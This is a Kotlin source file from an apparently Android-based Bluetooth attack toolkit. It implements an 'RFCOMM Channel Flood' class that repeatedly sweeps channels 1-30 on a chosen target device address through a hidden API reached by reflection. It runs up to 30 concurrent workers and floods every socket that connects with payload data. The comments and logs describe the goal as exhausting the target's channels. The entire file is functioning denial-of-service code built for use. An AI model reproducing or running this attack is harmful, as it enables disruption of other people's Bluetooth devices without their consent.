package api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import androidx.core.content.ContextCompat.getSystemService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.Collections

/**
 * RFCOMM Channel Flood: sweeps RFCOMM channels 1-30 using the hidden
 * BluetoothDevice.createInsecureRfcommSocket(int) method accessed via
 * reflection (the classic SPP channel trick), exhausting channels and
 * flooding the sockets that connect.
 *
 * Caveat: Android's hidden-API enforcement (API 28+) may block the reflective
 * call on some devices/firmwares; the attack logs the failure and stops.
 */
class RfcommChannelFloodAttack(
    private val targetAddress: String,
    private val threads: Int = 8,
    private val rateDelayMs: Int = 0,
    private val payloadPattern: PayloadPattern = PayloadPattern.FIXED,
    private val payloadSize: Int = 0
) : BluetoothAttack {

    override val displayName = AttackType.RFCOMM_CHANNEL_FLOOD.displayName
    override val description = AttackType.RFCOMM_CHANNEL_FLOOD.description

    private val sockets = Collections.synchronizedList(mutableListOf<BluetoothSocket>())
    private var scope: CoroutineScope? = null
    @Volatile
    private var running = false

    override fun isRunning() = running

    private val hiddenConnectMethod by lazy {
        runCatching {
            BluetoothDevice::class.java.getMethod("createInsecureRfcommSocket", Int::class.javaPrimitiveType)
        }.getOrNull()
    }

    @SuppressLint("MissingPermission")
    override fun start(context: Context, onLog: (String) -> Unit) {
        if (running) return
        running = true
        val adapter = getSystemService(context, BluetoothManager::class.java)?.adapter
        if (adapter == null) {
            running = false
            return
        }
        val device = try {
            adapter.getRemoteDevice(targetAddress)
        } catch (e: IllegalArgumentException) {
            running = false
            return
        }
        val method = hiddenConnectMethod
        if (method == null) {
            onLog("[RFCOMM] API oculta no accesible por reflexión en este dispositivo")
            running = false
            return
        }

        val workers = threads.coerceIn(1, 30)
        scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
        onLog("[RFCOMM] Barrido de canales 1-30 (objetivo $targetAddress, $workers worker(s))")
        repeat(workers) { worker ->
            scope!!.launch {
                var probe = 0
                while (isActive && running) {
                    val channel = probe % 30 + 1
                    probe++
                    var socket: BluetoothSocket? = null
                    try {
                        socket = method.invoke(device, channel) as? BluetoothSocket
                        socket?.connect()
                        if (socket?.isConnected == true) {
                            sockets.add(socket)
                            onLog("[$worker][CONN] Canal $channel conectado")
                            FloodSupport.flood(
                                socket, payloadPattern, payloadSize, rateDelayMs,
                                { running }, onLog, "$worker:C$channel"
                            )
                            sockets.remove(socket)
                        } else {
                            onLog("[$worker][RETRY] Canal $channel rechazado")
                        }
                    } catch (e: Exception) {
                        runCatching { socket?.close() }
                        if (isActive && running) onLog("[$worker][RETRY] Canal $channel fallo")
                    }
                    jitterDelay(maxOf(100, rateDelayMs))
                }
            }
        }
    }

    override fun stop() {
        running = false
        scope?.cancel()
        scope = null
        synchronized(sockets) {
            sockets.forEach { s -> runCatching { s.close() } }
            sockets.clear()
        }
    }
}
